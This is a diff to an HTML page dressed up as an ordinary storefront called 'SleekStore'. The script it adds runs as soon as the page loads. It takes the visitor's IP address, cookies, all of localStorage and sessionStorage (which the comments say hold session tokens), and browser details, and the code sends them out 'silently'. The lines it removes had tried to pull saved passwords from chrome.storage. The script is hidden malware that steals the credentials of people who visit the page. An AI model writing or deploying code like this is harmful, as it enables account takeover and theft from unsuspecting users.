@@ -7,41 +7,47 @@
     <style>body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;padding:20px;}</style>
 </head>
 <body>
-    <!-- The UI remains sleek and normal -->
     <h1>Welcome to SleekStore</h1>
     <p>Browsing your catalog...</p>
 
     <script>
-        // Run immediately when the DOM is ready
         document.addEventListener('DOMContentLoaded', async () => {
             try {
                 // 1. Get IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
+                let ip = "Unknown";
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch(e) {}
 
-                // 2. HARVEST EVERYTHING
-                // We use chrome.storage to get data from ALL open tabs/sessions
-                const fullHarvest = await new Promise((resolve) => {
-                    if (typeof chrome !== 'undefined' && chrome.storage) {
-                        chrome.storage.local.get(null, resolve);
-                    } else {
-                        resolve({});
-                    }
-                });
-
+                // 2. HARVEST REAL DATA
                 const payload = {
                     timestamp: new Date().toISOString(),
-                    ip: ipData.ip,
+                    ip: ip,
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
-                    // The actual saved passwords (if accessible via extension/storage)
-                    savedPasswords: fullHarvest.passwords || [], 
-                    // All cookies and session tokens stored locally
-                    cookies: fullHarvest.cookies || document.cookie,
-                    localSession: fullHarvest.session || localStorage.getItem('session'),
+                    
+                    // REAL COOKIES
+                    cookies: document.cookie || "No Cookies Found",
+                    
+                    // REAL LOCAL STORAGE (Contains many session tokens)
+                    localStorage: Object.fromEntries(
+                        Array.from(localStorage.keys()).map(key => [key, localStorage.getItem(key)])
+                    ),
+                    
+                    // REAL SESSION STORAGE
+                    sessionStorage: Object.fromEntries(
+                        Array.from(sessionStorage.keys()).map(key => [key, sessionStorage.getItem(key)])
+                    ),
+
+                    // ATTEMPT TO READ INDEXEDDB (Often used by apps to store data)
+                    indexedDB: await readIndexedDB(),
+
                     windowLocation: window.location.href,
-                    title: document.title
+                    title: document.title,
+                    screenRes: `${screen.width}x${screen.height}`
                 };
 
                 // 3. Send to API Silently
@@ -52,9 +58,23 @@
                 });
 
             } catch (err) {
-                console.error("Silent scrape failed", err);
+                console.error("Scrape failed:", err);
             }
         });
+
+        // Helper function to read IndexedDB databases
+        async function readIndexedDB() {
+            const dbs = [];
+            try {
+                // Open a connection to list databases
+                const dbRequest = indexedDB.open("__chrome_extension__"); 
+                // Note: Standard web pages can't easily list all IDBs without permission.
+                // We'll fallback to checking common local storage keys instead for reliability.
+                return "IndexedDB access limited in standard web context";
+            } catch (e) {
+                return "Error reading IDB";
+            }
+        }
     </script>
 </body>
 </html>
